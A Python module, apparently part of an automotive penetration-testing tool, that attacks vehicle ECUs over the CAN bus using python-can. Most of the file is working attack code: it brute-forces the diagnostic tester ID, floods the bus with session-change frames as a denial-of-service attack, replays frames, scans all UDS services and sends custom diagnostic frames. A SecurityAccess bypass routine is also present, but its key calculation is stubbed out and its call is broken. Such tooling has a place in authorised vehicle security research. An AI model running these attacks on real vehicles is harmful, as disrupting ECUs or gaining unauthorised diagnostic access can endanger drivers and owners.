import can  # pip install python-can - pip install uptime
import datetime
import time


# Aux to scan cyclic IDs
def scanningIDs(bus, iteration):
    counter = 0
    for msg in bus:
        if hex(msg.arbitration_id) not in normalTrafficIDs:
            normalTrafficIDs.append(hex(msg.arbitration_id))
        counter += 1

        if counter > iteration:
            break


# Aux to setup the UDS services/response codes for the user explaination

services = {
    0x10: 'DiagnosticSessionControl', 0x11: 'ECUReset', 0x14: 'ClearDiagnosticInformation', 0x19: 'ReadDTCInformation',
    0x22: 'ReadDataByIdentifier', 0x23: 'ReadMemoryByAddress', 0x24: 'ReadScalingDataByIdentifier',
    0x27: 'SecurityAccess',
    0x28: 'CommunicationControl', 0x29: 'Authentication', 0x2A: 'ReadDataPeriodicIdentifier',
    0x2C: 'DynamicallyDefineDataIdentifier', 0x2E: 'WriteDataByIdentifier', 0x2F: 'InputOutputControlByIdentifier',
    0x31: 'RoutineControl',
    0x34: 'RequestDownload', 0x35: 'RequestUpload', 0x36: 'TransferData', 0x37: 'RequestTransferExit',
    0x38: 'RequestFileTransfer', 0x3D: 'WriteMemoryByAddress', 0x3E: 'TesterPresent', 0x83: 'AccessTimingParameter',
    0x84: 'SecuredDataTransmission', 0x85: 'ControlDTCSetting', 0x86: 'ResponseOnEvent', 0x87: 'LinkControl'
}

servicesResponse = {
    0x50: 'DiagnosticSessionControlPositiveResponse', 0x51: 'ECUResetPositiveResponse',
    0x54: 'ClearDiagnosticInformationPositiveResponse', 0x59: 'ReadDTCInformationPositiveResponse',
    0x62: 'ReadDataByIdentifierPositiveResponse', 0x63: 'ReadMemoryByAddressPositiveResponse',
    0x64: 'ReadScalingDataByIdentifierPositiveResponse',
    0x67: 'SecurityAccessPositiveResponse', 0x68: 'CommunicationControlPositiveResponse',
    0x69: 'AuthenticationPositiveResponse', 0x6A: 'ReadDataPeriodicIdentifierPositiveResponse',
    0x6C: 'DynamicallyDefineDataIdentifierPositiveResponse',
    0x6E: 'WriteDataByIdentifierPositiveResponse', 0x6F: 'InputOutputControlByIdentifierPositiveResponse',
    0x71: 'RoutineControlPositiveResponse', 0x74: 'RequestDownloadPositiveResponse',
    0x75: 'RequestUploadPositiveResponse',
    0x76: 'TransferDataPositiveResponse', 0x77: 'RequestTransferExitPositiveResponse',
    0x78: 'RequestFileTransferPositiveResponse', 0x7D: 'WriteMemoryByAddressPositiveResponse',
    0x7E: 'TesterPresentPositiveResponse',
    0xC3: 'AccessTimingParameterPositiveResponse', 0xC4: 'SecuredDataTransmissionPositiveResponse',
    0xC5: 'ControlDTCSettingPositiveResponse', 0xC6: 'ResponseOnEventPositiveResponse',
    0xC7: 'LinkControlPositiveResponse', 0x7f: 'NegativeResponse'
}

negativeResponseCodes = {
    0x00: 'positiveResponse', 0x10: 'generalReject', 0x11: 'serviceNotSupported', 0x12: 'subFunctionNotSupported',
    0x13: 'incorrectMessageLengthOrInvalidFormat', 0x14: 'responseTooLong', 0x20: 'ISOSAEReserved',
    0x21: 'busyRepeatRequest', 0x22: 'conditionsNotCorrect', 0x23: 'ISOSAEReserved',
    0x24: 'requestSequenceError', 0x25: 'noResponseFromSubnetComponent',
    0x26: 'failurePreventsExecutionOfRequestedAction', 0x31: 'requestOutOfRange', 0x33: 'securityAccessDenied',
    0x35: 'invalidKey', 0x36: 'exceedNumberOfAttempts',
    0x37: 'requiredTimeDelayNotExpired', 0x3A: 'secureDataVerificationFailed', 0x70: 'uploadDownloadNotAccepted',
    0x71: 'transferDataSuspended', 0x72: 'generalProgrammingFailure', 0x73: 'wrongBlockSequenceCounter',
    0x78: 'requestCorrectlyReceived-ResponsePending',
    0x7E: 'subFunctionNotSupportedInActiveSession', 0x7F: 'serviceNotSupportedInActiveSession', 0x80: 'ISOSAEReserved',
    0x81: 'rpmTooHigh', 0x82: 'rpmTooLow', 0x83: 'engineIsRunning', 0x84: 'engineIsNotRunning',
    0x85: 'engineRunTimeTooLow',
    0x86: 'temperatureTooHigh', 0x87: 'temperatureTooLow', 0x88: 'vehicleSpeedTooHigh', 0x89: 'vehicleSpeedTooLow',
    0x8a: 'throttle/PedalTooHigh', 0x8b: 'throttle/PedalTooLow', 0x8c: 'transmissionRangeNotInNeutral',
    0x8d: 'transmissionRangeNotInGear',
    0x8e: 'ISOSAEReserved', 0x8f: 'brakeSwitch(es)NotClosed', 0x90: 'shifterLeverNotInPark',
    0x91: 'torqueConverterClutchLocked', 0x92: 'voltageTooHigh', 0x93: 'voltageTooLow'
}


# Aux to send a message on the bus
def sendMessage(bus, msg, serviceID, doNotWait=False):
    try:
        bus.send(msg)
        time.sleep(0.01)
        return catchResponse(bus, serviceID, doNotWait)

    except can.CanError:
        return str("CAN ERROR")


# Aux to catch the response of the sent CAN frame
def catchResponse(bus, serviceID, doNotwait=False):
    endTime = datetime.datetime.now() + datetime.timedelta(milliseconds=50)
    for msg in bus:
        # The tester response ID is known 
        if msg.arbitration_id == testerResponseID:
            payload = [f"{byte:#02x}" for byte in msg.data]

            if int(payload[1], 16) == 0x7f:
                if int(payload[2], 16) == serviceID:
                    break
            else:
                if int(payload[1], 16) == serviceID + 64:  # dec(64) == hex(40)
                    break

        # The tester response ID is unknown (Brute force and sniffing)
        elif hex(msg.arbitration_id) != '0x00000000' and hex(msg.arbitration_id) not in normalTrafficIDs:
            break
        # Exit "infinite" wait, don't need to wait response (case of brute force or UDS scanning)
        elif doNotwait and datetime.datetime.now() >= endTime:
            return can.Message(arbitration_id=0xFFFFFFFF, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                               is_extended_id=True, is_rx=False)

    return msg


# Aux used to check the response for the scanning
def checkResponse(msg, serviceID):
    # This check is made to avoid the exception in case the user spam change the features
    if isinstance(msg, str):
        return
    responseData = [f"{byte:#02x}" for byte in msg.data]
    if responseData[1] == '0x7f':

        # We save the result only if the service and subservice are supported (they don't exist otherwise)
        if responseData[3] != '0x11' and responseData[3] != '0x12':
            return responseData
    else:

        # We ignore the ISO TP responses by now
        if int(responseData[0], 16) <= 7 and responseData[1] != serviceID and int(responseData[0], 16) > 0:
            return responseData


# Aux to save the UDS scanning report on a file
def catalogResponse(responseDict, folder_path):
    global services
    global negativeResponseCodes

    fileScanningUDSAttack = open(folder_path + "/UDS_scanning_attack_report.txt", "w")
    # I censored the payload because at the moment we don't need it
    var = {(fileScanningUDSAttack.write(services.get(int(key[0], 16)) + "(" + (key[0]) + ")" + ' ' + key[1] + " " + str(
        negativeResponseCodes.get(int(val[3], 16))) + '\n')) if val[  # ] + str(val).replace(" ", "") + '\n')) if val[
                                                                    1] == '0x7f' else fileScanningUDSAttack.write(
        services.get(int(key[0], 16)) + "(" + (key[0]) + ")" + ' ' + key[1] + ' PositiveResponse' + '\n') for
           # + ' ' + str(val).replace(" ", "") + '\n') for
           key, val in responseDict.items()}

    fileScanningUDSAttack.close()
    print("Write done!")
    fileScanningUDSAttackRead = open(folder_path + "/UDS_scanning_attack_report.txt", "r")
    return fileScanningUDSAttackRead.read()


# Aux to calculate the key for the security access
def calculateKey(bus, seed, seedRequestResponse):
  #as this funtion depends on so many factors, it was decided to be left out for this specific usecase
    return 0
    


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ 
# 1) Normal bus traffic sniffing
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/

def BusSniffing(bus):
    for msg in bus:
        return msg


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/
# 2) Sniffing the frames from new IDs and save them on a file
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/

def SniffingNewFrames(bus):
    for msg in bus:
        if hex(msg.arbitration_id) not in normalTrafficIDs:
            differentFrames.append(msg)
            return msg


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/
# 3) Brute force all the combinations to find the Tester ID
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/

def BruteForceTesterID(bus):
    global testerID
    global testerResponseID

    if testerID != 0:
        print("Tester ID is already known: " + str(hex(testerID)))
        print("Tester Response ID is already known: " + str(hex(testerResponseID)))

        return "Oh yes, Brute force attack terminated with success!\n\nTester ID has been obtained:" + str(
            hex(testerID)) + "\n\n" + "Tester Response ID:" + str(hex(testerResponseID))

    print("\n--0--0-- Brute forcing the tester and tester response IDs --0--0--")
    currentTesterID = 0x00000000

    while currentTesterID < 0xFFFFFFFF:
        msg = can.Message(arbitration_id=currentTesterID, data=[0x01, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                          is_extended_id=True, is_rx=False)

        response = sendMessage(bus, msg, 0x3E, True)

        if hex(response.arbitration_id) != '0xffffffff':
            data = [f"{byte:#02x}" for byte in response.data]

            if data[1] == '0x7e' or data[1] == '0x7f':
                break

        currentTesterID += 0x00000001

    print('\nTester ID is: ' + str(hex(currentTesterID)))
    print('Tester response ID is: ' + str(hex(response.arbitration_id)))

    testerID = currentTesterID
    testerResponseID = response.arbitration_id


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/
# 4) DoS attack 
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/

def DoSAttack(bus):
    msg = can.Message(arbitration_id=testerID, data=[0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00],
                      is_extended_id=True, is_rx=False)

    t_end = time.time() + 60
    while time.time() < t_end:
        try:
            bus.send(msg)

        except can.CanError:
            print("Message NOT sent")
            continue


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ 
# 5) Replay attack based on a new message obtained from the scanning
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/

def ReplayAttack(bus, msg, serviceID):
    # msgIndex = input('\nSelect the message you want to replay by the index: ')
    #
    # msgIndex = int(msgIndex)

    # if msgIndex > len(differentFrames) or len(differentFrames) == 0:
    # break

    #vedi "AVL_Pentesting.py"
    return sendMessage(bus, msg, serviceID)
    # print(catchResponse(bus))


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/
# 6) Scan for all the UDS services and report the result
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ 
def ScanningUDSAttack(bus, folder_path):
    startingPayload = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
    responseDict = {}
    print("\nWriting the results of UDS Scanning attack on the file UDS_scanning_attack_report.txt...")

    for serviceID in services.keys():

        payload = startingPayload
        payload[1] = serviceID

        subFuncID = 0x00
        while subFuncID < 0x10:
            payload[2] = subFuncID

            msg = can.Message(arbitration_id=testerID, data=payload, is_extended_id=True, is_rx=False)

            responseDict[(str(hex(serviceID)), str(hex(subFuncID)))] = checkResponse(
                sendMessage(bus, msg, serviceID, True), str(hex(serviceID)))
            subFuncID += 0x01

        serviceID += 0x01

    responseDict = {key: val for key, val in responseDict.items() if val != None}
    return catalogResponse(responseDict, folder_path)


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ 
# 7) Send security access and gaining permissions after sniffing and analysis
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ 
def SecurityAccessExploitation(bus):
    # print("\n--o-- Changing session... --o--")
    # print("\nChange session response:")

    changingSessionMsg = can.Message(arbitration_id=testerID, data=[0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00],
                                     is_extended_id=True, is_rx=False)
    sendMessage(bus, changingSessionMsg, 0x10)
    # --------------------------------------------------

    # print("\n--o-- Sending request seed... --o--")
    seedRequest = can.Message(arbitration_id=testerID, data=[0x02, 0x27, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00],
                              is_extended_id=True, is_rx=False)

    seedRequestResponse = sendMessage(bus, seedRequest, 0x27)

    # # This check is made to avoid the exception in case the user spam change the features
    if isinstance(seedRequestResponse, str):
        return

    if seedRequestResponse.data[1] == 127:
        error = str(negativeResponseCodes.get(seedRequestResponse.data[3]))
        # print("\n--X--X-- Security access failed --X--X--")
        return seedRequest, seedRequestResponse, seedRequest, seedRequest, error

    # print("\n--o-- Calculating and sending key... --o--")
    # Get seed from ECU response
    seed = int.from_bytes(seedRequestResponse.data[3:7], 'big')

    print("\nSeed extracted hex: ", hex(seed))

    # Calculate Key from previous analysis
    sendKey, keyValidationResponse = calculateKey(bus, seed, seedRequestResponse)
    sendKeyHex = hex(int.from_bytes(sendKey.data[3:7], 'big'))
    print("Key computed from the seed: ", sendKeyHex)
    # This check is made to avoid the exception in case the user spam change the features
    if isinstance(keyValidationResponse, str):
        return

    # print("\nKey validation response:")
    error = ""
    if keyValidationResponse.data[1] == 127:
        # print("\n--X--X-- Security access failed --X--X--\n")
        # print("Reason: " + str(negativeResponseCodes.get(keyValidationResponse.data[3])))
        error = str(negativeResponseCodes.get(keyValidationResponse.data[3]))

    return seedRequest, seedRequestResponse, sendKey, keyValidationResponse, error


# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ 
# 8) Send custom CAN frames
# % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/ % \_/

def SendCustomCanFrames(bus):
    while True:

        print("\nBuild your diagnostic CAN frame as below:")
        frame = input(
            "[length serviceID subServiceID payload ...]\nPress \'q\' to quit and return to the main menu\n").split(' ')

        if frame[0] == 'q':
            return

        payload = []
        [payload.append(int(num, 16)) for num in frame]

        while len(payload) < 8:
            payload.append(0x0)

        msg = can.Message(arbitration_id=testerID, data=payload, is_extended_id=True, is_rx=False)

        print(sendMessage(bus, msg, payload[1], True))  # , payload[1])

#-----SETUP BUS FOR A CORRECT INITIALIZATION-----#
def SetupBus():
    bus = can.Bus(interface='pcan', channel='PCAN_USBBUS1', bitrate=500000)
    scanningIDs(bus, 1000)
    return bus


normalTrafficIDs = []
differentFrames = []
testerID = 0x00000000
testerResponseID = 0x00000000


#----------------------------------------------#